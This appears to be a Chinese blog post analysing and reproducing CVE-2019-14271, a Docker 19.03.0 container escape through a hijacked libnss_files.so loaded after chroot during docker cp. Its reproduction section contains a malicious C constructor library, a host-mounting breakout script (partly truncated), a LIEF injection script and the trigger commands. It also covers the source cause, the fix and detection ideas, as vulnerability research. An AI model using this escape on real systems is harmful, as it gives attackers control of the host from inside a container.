---
title: CVE-2019-14271 分析复现
date: 2022-11-15 20:20:12
tags: CVE复现
author: click
---
## 基础知识

### docker cp 流程

[docker cp 源码分析](/2022/11/04/CVE-2018-15664#docker-cp-%E5%AE%9E%E7%8E%B0%E6%B5%81%E7%A8%8B)

**新版本变化**: 在 docker 19.03 中，为了解决 CVE-2018-15664 的问题，在从容器向宿主机复制文件，调用 `archive.TarWithOptions()` 前，使用 `realchroot()` 将 cwd 和 root 设置到 `container.BaseFS.Path()`（_attacker 不可控_），来避免容器中文件路径中存在符号链接解析，导致路径穿越的问题。
因此在 docker cp 从容器中向宿主机复制文件时，在调用 `archive.TarWithOptions()`（归根到底是调用到 `user.lookupUnixUid()` => `C.mygetpwuid_r()`，该函数是 nsswitch 动态库中 `getpwuid_r()` 函数的封装 ） 前，都 chroot 到了容器根目录中。

### Cgo

[https://chai2010.cn/advanced-go-programming-book/ch2-cgo/ch2-01-hello-cgo.html](https://chai2010.cn/advanced-go-programming-book/ch2-cgo/ch2-01-hello-cgo.html)
[https://go.dev/blog/cgo](https://go.dev/blog/cgo)
[Cgo 静态库和动态库](https://chai2010.cn/advanced-go-programming-book/ch2-cgo/ch2-09-static-shared-lib.html)
Cgo 实现了在 Go 中直接调用内嵌 c 代码的功能，Cgo 使用 gcc 来编译和链接 C 和 Go 桥接的代码。
包含了 Cgo 内容的 go 程序，如果在编译时没有指定静态编译方式（_1. 通过 CGO_ENABLED=0 2. 通过指定外部链接器和 static 标志_），则编译出的文件会是一个动态链接的二进制文件，执行到动态库中的函数时，会加载对应的依赖库。
[CGO_ENABLED 环境变量对 Go 静态编译机制的影响](https://juejin.cn/post/6844903619527983111)

### Go 导入包的查找顺序

不使用 `go mod` 管理（`GO111MODULE="off"`）：

- `vendor` 目录下的包
- `$GOPATH/src` 下的包
- $`GOROOT/src` 下的包（内置包的位置）

注意这时要么都使用 `vendor` 下的包，要么都使用 `$GOPATH` 下的包，不会混用

使用 `go mod` 管理（GO111MODULE="on"）

- 优先使用 `vendor` 目录下的包
- `$GOPATH/pkg/mod/` 下的包
- `$GOROOT/src 下的包`（内置包）

`vendor` 和 `pkg/mod` 下的包也不会混用

## 漏洞详情

### 简介

由于 docker cp 过程中，为了防止 CVE-2018-15664 这类路径穿越问题，在调用 docker-tar 和 docker-untar 中，进程根目录被 chroot 到了容器根目录中。在切换根目录操作之后，存在调用动态库中函数（`getpwuid_r()`）。
要注意此进程的相关上下文（ns 之类，除了进程的 root 目录）都属于宿主机（是一个高权限进程），而所执行的动态库函数是容器可控的。攻击者可以通过定制一个恶意动态库文件，在宿主机执行 docker cp 时，恶意动态库中的代码将会被宿主机执行，从而实现逃逸，也就是常见的 so 库劫持。

### 影响

静态编译版本不受影响
非静态编译的 19.03.0 <= docker < 19.03.1 受影响

## 漏洞复现

### 复现环境

- docker 19.03.0

```bash
root@click:~# docker version
# client 版本不限
Client: Docker Engine - Community
 Version:           20.10.21
 API version:       1.40
 Go version:        go1.18.7
 Git commit:        baeda1f
 Built:             Tue Oct 25 18:02:00 2022
 OS/Arch:           linux/amd64
 Context:           default
 Experimental:      true

Server: Docker Engine - Community
 Engine:
  Version:          19.03.0
  API version:      1.40 (minimum version 1.12)
  Go version:       go1.12.5
  Git commit:       aeac949
  Built:            Wed Jul 17 18:13:43 2019
  OS/Arch:          linux/amd64
  Experimental:     false
 containerd:
  Version:          1.6.12
  GitCommit:        a05d175400b1145e5e6a735a6710579d181e7fb0
 runc:
  Version:          1.1.4
  GitCommit:        v1.1.4-0-g5fd4c4d
 docker-init:
  Version:          0.18.0
  GitCommit:        fec3683
```

- lief
  [https://github.com/lief-project/LIEF](https://github.com/lief-project/LIEF)
  用来注入 so 库文件

### 复现过程

1. 编译一个恶意代码库文件（library），用来注入到会被调用到的 libnss_files-xx.so 文件中

```c
#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <unistd.h>
#include <string.h>
#include <sys/wait.h>

#define ORIGINAL_LIBNSS "/lib/x86_64-linux-gnu/libnss_files-2.27-origin.so"
#define LIBNSS_PATH "/lib/x86_64-linux-gnu/libnss_files.so.2"

bool is_priviliged();

__attribute__ ((constructor)) void back(void) {
    char *argv_break[2];
    // 检查是否为宿主机进程
    if (!is_priviliged())
        return;
    // 将原始 libnss_files 文件替换回来，在实验中，如果不替换回来会导致无限调用此恶意函数，因为 retry 调用
    rename(ORIGINAL_LIBNSS, LIBNSS_PATH);
    
    // 在子进程中执行恶意代码部分放到 breakout 脚本中，可以方便定义执行命令内容
    if (!fork()) {
        // child process
        argv_break[0] = strdup("/breakout");
        argv_break[1] = NULL;
        execve("/breakout", argv_break, NULL);
    }
    else {
        wait(NULL);
    }
    return;
}

// 通过检查容器中 /proc/self/exe 是否存在来判断是否为宿主机进程（特权进程）
bool is_priviliged() {
    FILE *proc_file_in_cnt = fopen("/proc/self/exe", "r");
    // process in conainer
    if (proc_file_in_cnt != NULL) {
        fclose(proc_file_in_cnt);
        return false;
    }
    // process in host
    return true;
}
```

```bash
gcc -shared -fPIC /tmp/evil.c -o /tmp/evil.out
```

2. 编写所要执行的恶意代码脚本 breakout，这里的逃逸效果选择将宿主机文件系统挂载到容器中

```c
#!/bin/bash
umount /host_proc; rm -rf /host_proc
umount /host_fs; rm -rf /host_fs

mkdir /host_proc
mount -t proc none /host_proc
cd /host_proc/1/root

mkdir /host_fs
mount --bind
```

3. 将恶意库文件注入到 libnss_files-xx.so 中

```python
import lief

lib_file = lief.parse("")
lib_file.add_library("/tmp/evil.out")
lib_file.write("/tmp/libnss_files.so.2")
```

4. 将注入好的恶意库文件，所调用的 evil.out 库文件，breakout 逃逸脚本保存在容器中（当然也可以直接在容器中进行 1/2 两步）

```bash
docker cp /tmp/evil.out [cnt-id]:/tmp/
docker cp /tmp/libnss_files.so.2 [cnt-id]:/lib/x86_64-linux-gnu/
docker cp /tmp/breakout [cnt-id]:/tmp/
```

5. 执行 docker cp，从容器中复制文件到宿主机上，触发 docker-tar 执行，从而出发恶意代码被宿主机上下文进程执行。

```bash
docker cp [cnt-id]:/etc/passwd /tmp/
```

6. 验证恶意代码执行成功，宿主机 proc 文件系统被挂载到 /host_proc 上，宿主机根文件系统被挂载到容器中的 /host_fs 上。

```bash
# in container
ls /host_proc
...
ls /host_fs
...
```
  
  

## 漏洞分析

### docker cp 流程分析

见 [CVE-2018-15664](/2022/11/04/CVE-2018-15664#docker-cp-%E5%AE%9E%E7%8E%B0%E6%B5%81%E7%A8%8B)，其中部分细节有所不同，可以对比 docker 19.03.0 源码看。

### docker-tar 流程分析

根据 docker cp 的流程来看，可以看到在从容器向宿主机复制文件时，会通过 reexec 机制调用 docker-tar 命令。
![image.png](https://b3logfile.com/file/2023/03/solo-fetchupload-16837957405232876497-hr2Cyi7.png)
![image.png](https://b3logfile.com/file/2023/03/solo-fetchupload-3075220474110111395-UlQymjX.png)
![image.png](https://b3logfile.com/file/2023/03/solo-fetchupload-8868303483394173714-DdHcm4N.png)
传入的第 2 个参数 `relSrc` 为容器中源文件的路径（相对于容器文件系统），第 3 个参数 `root` 为指定容器的根目录在宿主机上的路径。
![image.png](https://b3logfile.com/file/2023/03/solo-fetchupload-14928263318781436464-ugmzDo8.png)
跟进 `docker-tar` 注册的回调函数 `tar()` 中：
![image.png](https://b3logfile.com/file/2023/03/solo-fetchupload-3069689227827309241-HdZurQt.png)
可以看到 docker-tar 执行时，**先通过 `realChroot()`（chroot 的包装）将进程根目录切换到容器目录下，随后调用 `archive.TarWithOptions()` 来打包容器中的源文件**。
`archive.TarWithOptions()` => `addTarFile()` => `FileInfoHeader()` => `tar.FileInfoHeader()` （在 docker 19.03 中这里的 tar 包是 go sdk 中的 archive/tar 内置包，而不是之前优先加载的 vendor 目录下的 archive/tar），其中的 `sysStat` 在 stat_unix.go 中注册：
![image.png](https://b3logfile.com/file/2023/03/solo-fetchupload-1451826403087574554-Z4efoGj.png)
sysStat 中调用了 user.LookupId() 及 user.LookupGroupId()，（os/user 库中的函数，就要注意是否调用了 cgo 内容）。
![image.png](https://b3logfile.com/file/2023/03/solo-fetchupload-13969212723544706736-bRPcZoE.png)
这两个函数的实现中包含了 cgo 部分(os/user/cgo_lookup_unix.go 中)，并函数实现在动态链接库 libnss_files.so 中：
![image.png](https://b3logfile.com/file/2023/03/solo-fetchupload-3453910324709686291-K8GxuuG.png)
![image.png](https://b3logfile.com/file/2023/03/solo-fetchupload-5468141264181273142-u6mdr9W.png)
![image.png](https://b3logfile.com/file/2023/03/solo-fetchupload-5130992679577141526-1trVZcu.png)
![image.png](https://b3logfile.com/file/2023/03/solo-fetchupload-12848425403469542140-OebrWse.png)
![image.png](https://b3logfile.com/file/2023/03/solo-fetchupload-10132695049033324924-nHrUZqO.png)
在 cgo_lookup_unix.go 的 build tags 中可以看到
![image.png](https://b3logfile.com/file/2023/03/solo-fetchupload-4322996742072433178-RR5cR7l.png)
所以如果 dockerd 是动态编译版本，并且开启了 cgo，没有使用 osusergo tag，则运行到这里的时候会加载 /lib/x86_64-linux-gnu/libnss_files.so 来执行其中定义的 getpwuid_r/getgrgid_r 函数。**注意：此时进程的根目录已经切换到了容器中，所以加载的链接库也相应的是容器中的 so 文件！而这个 docker-tar 进程是一个高权限进程（宿主机 ns/cgroup，宿主机 cap），所以通过修改 so 库内容，会导致高权限进程的任意代码执行。**

### 静态编译版本是否受影响

静态编译版本中，使用了 osusergo build tag 保证了 os/user 包不会使用 cgo 内容，也就不会调用 so 库中的内容，所以不会受到影响：
![image.png](https://b3logfile.com/file/2023/03/solo-fetchupload-13430627284011737437-XUx0akr.png)

## 漏洞修复分析

### 缓解方案

在 docker 19.03.1 中，在执行 chroot 之前，通过调用链接库相关函数，提前加载了涉及到的 so 库文件。避免在 chroot 到容器环境中后从容器文件系统中获取 so 库文件。
![image.png](https://b3logfile.com/file/2023/03/solo-fetchupload-8830897008245628698-VEIFrOq.png)
但是如果宿主机上加载 libnss_files.so 失败，那么还是会在 chroot 到容器中尝试加载容器中的 so 文件。

### 修复方案

在 docker 18.09.8 之前，vendor 目录下包含 archive/tar 包，因此在上述 docker-tar 流程中会调用 vendor/archive/tar 包中的 `sysUnix()` 函数，而这个版本的 `sysUnix()` 函数不包含 cgo 内容，因此是不会掉用 so 库内容的，没有风险。
![image.png](https://b3logfile.com/file/2023/03/solo-fetchupload-1523586788801039097-D2KzSt9.png)
为了避免 19.03.0 动态链接版本中调用 go 内置 archive/tar 包中包含调用动态链接函数的 `statUnix()` 方法，在之后的版本中，将旧版本中 vendor 下的不包含 cgo 内容的 archive/tar 包还原了回来，这样优先加载 vendor 中的 `statUnix()` 方法，不会去调用动态链接函数。

## 思考

- 漏洞成因核心
高权限进程的执行内容被容器中内容污染，造成宿主机任意代码执行。
- 漏洞行为特征
以下两条可以以此作为运行时监控的事中告警依据：
(1) docker 进程/容器外进程（高权限进程），在执行过程中调用了容器文件系统中的链接库文件/或其他文件
(2) 在攻击成功后，会打开宿主机文件系统中的文件（排除掉挂载到容器中的 volume）
- 针对 docker 源码的审计
检查 docker 依赖的 cgo 动态库文件，寻找调用库函数的时的上下文情况是否会暴露给容器

## 问题

bind mount 可以跨越 mnt namespace 吗？不可以

## 参考链接

- [https://unit42.paloaltonetworks.com/docker-patched-the-most-severe-copy-vulnerability-to-date-with-cve-2019-14271/](https://unit42.paloaltonetworks.com/docker-patched-the-most-severe-copy-vulnerability-to-date-with-cve-2019-14271/)
- [https://github.com/moby/moby/issues/39449](https://github.com/moby/moby/issues/39449)
- [https://blog.csdn.net/s2603898260/article/details/105632270](https://blog.csdn.net/s2603898260/article/details/105632270)
- [https://github.com/moby/moby/pull/39612/files](https://github.com/moby/moby/pull/39612/files)



